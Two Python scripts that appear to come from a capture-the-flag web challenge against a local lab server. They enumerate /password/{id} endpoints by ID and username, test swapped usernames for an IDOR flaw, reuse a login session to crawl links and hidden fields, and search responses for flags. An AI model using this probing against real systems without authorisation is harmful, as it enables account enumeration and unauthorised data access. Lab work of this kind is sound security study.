import requests
import re

base_url = "http://127.0.0.1:32933"

# First, verify the response size pattern
print("[+] Detailed /password/{id} enumeration...")
print("=" * 60)

size_map = {}
results = []

# Test numeric IDs
for i in range(1, 51):
    resp = requests.get(f"{base_url}/password/{i}")
    size = len(resp.text)
    if size not in size_map:
        size_map[size] = []
    size_map[size].append(i)
    
    # Check for FLAG
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    if flags:
        print(f"[!] FLAG at /password/{i}: {flags}")
        print(f"    Response: {resp.text}")

# Print summary
print("\n[+] Size summary for numeric IDs:")
for size, ids in sorted(size_map.items()):
    print(f"    Size {size}: IDs {ids}")

# Test common usernames
print("\n[+] Testing common username endpoints...")
usernames = ['admin', 'root', 'administrator', 'john', 'jane', 'user', 'guest', 'tester', 'dev', 'developer', 'support', 'manager', 'test2', 'test1', 'test3']

for user in usernames:
    resp = requests.get(f"{base_url}/password/{user}")
    size = len(resp.text)
    
    # Check content differences
    user_match = re.findall(r'Welcome, ([^.!]+)', resp.text)
    uid_match = re.findall(r'name="user_id".*?value="(\d+)"', resp.text)
    
    if user_match or uid_match:
        print(f"[+] /password/{user}: Size={size}, Name={user_match}, UID={uid_match}")
    elif size not in [1287, 1418]:
        print(f"[?] /password/{user}: Size={size} (unusual)")
        if size > 1000:
            print(f"    Preview: {resp.text[:500]}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.I)
    if flags:
        print(f"[!] FLAG at /password/{user}: {flags}")
        print(f"    Full response: {resp.text}")

# Test POST to /password/{id} without auth cookie for IDOR
print("\n[+] Testing POST to /password/{id} for IDOR...")

# First POST normally
data_base = {'username': 'test', 'user_id': '10032', 'password': 'test'}
resp_base = requests.post(f"{base_url}/password/test", data=data_base)
print(f"[+] Baseline POST: Size={len(resp_base.text)}")

# POST with different usernames
for test_user in ['admin', 'root', 'test2']:
    data_test = {'username': test_user, 'user_id': '10032', 'password': 'test'}
    resp = requests.post(f"{base_url}/password/test", data=data_test)
    
    # Check redirect
    if resp.status_code in [301, 302]:
        print(f"[+] {test_user}: Redirect {resp.status_code} to {resp.headers.get('Location')}")

# Try to see if there's a different response when we succeed login
print("\n[+] Testing login response patterns...")
resp_correct = requests.post(f"{base_url}/password/test", data={'username': 'test', 'user_id': '10032', 'password': 'test'}, allow_redirects=True)
print(f"[+] Login with correct password: Final URL={resp_correct.url}")
print(f"    Final size={len(resp_correct.text)}")

# Check if we got a new session
if resp_correct.history:
    for r in resp_correct.history:
        set_cookie = r.headers.get('Set-Cookie')
        if set_cookie:
            print(f"    Set-Cookie at {r.url}: {set_cookie}")

flags = re.findall(r'FLAG\{[^}]+\}', resp_correct.text, re.I)
if flags:
    print(f"[!] FLAG in login response: {flags}")
    print(f"    Full: {resp_correct.text}")
import requests
import re

base_url = "http://127.0.0.1:32933"

# Get a fresh session by logging in
print("[+] Getting fresh session by logging in...")
resp = requests.post(f"{base_url}/password/test", 
                     data={'username': 'test', 'user_id': '10032', 'password': 'test'},
                     allow_redirects=True)
fresh_session = resp.cookies.get('session')
print(f"[+] Fresh session: {fresh_session}")

# Try accessing root with valid session
print("\n[+] Accessing / with valid session...")
headers = {'Cookie': f'session={fresh_session}', 'User-Agent': 'Mozilla/5.0'}
root_resp = requests.get(base_url + "/", headers=headers)
print(f"    Status: {root_resp.status_code}")
print(f"    Size: {len(root_resp.text)}")
print(f"    Content preview:\n{root_resp.text[:1500]}")

# Extract all potential endpoints
print("\n[+] Extracting endpoints from authenticated root...")
links = re.findall(r'href=["\']([^"\']+)["\']', root_resp.text)
print(f"    Links: {links}")

# Extract any API calls or JavaScript endpoints
api_patterns = re.findall(r'[\'"](/[a-zA-Z0-9_/]+)[\'"]', root_resp.text)
print(f"    Possible endpoints in JS: {list(set(api_patterns))}")

# Check script tags for more endpoints
scripts = re.findall(r'src=["\']([^"\']+\.js)["\']', root_resp.text)
print(f"    Script files: {scripts}")

# Try accessing each unique endpoint
unique_links = list(set([l for l in links if not l.startswith('/static/')]))
print(f"\n[+] Testing unique non-static endpoints: {unique_links}")

for link in unique_links:
    full_url = base_url + link if link.startswith('/') else base_url + '/' + link
    test_resp = requests.get(full_url, headers=headers)
    print(f"[+] {link}: Status={test_resp.status_code}, Size={len(test_resp.text)}")
    
    flags = re.findall(r'FLAG\{[^}]+\}', test_resp.text, re.I)
    if flags:
        print(f"    [!] FLAG FOUND: {flags}")
        print(f"    Response: {test_resp.text}")

# Test dashboard again with fresh session
print("\n[+] Testing /dashboard with fresh session...")
dash_resp = requests.get(base_url + "/dashboard", headers=headers)
print(f"    Status: {dash_resp.status_code}")
if dash_resp.status_code != 500:
    print(f"    Size: {len(dash_resp.text)}")
    print(f"    Content: {dash_resp.text[:1000]}")

# Also check for any hidden fields in forms
hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'].*?>', root_resp.text)
print(f"\n[+] Hidden form fields: {len(hidden_fields)}")
for hf in hidden_fields:
    print(f"    {hf}")
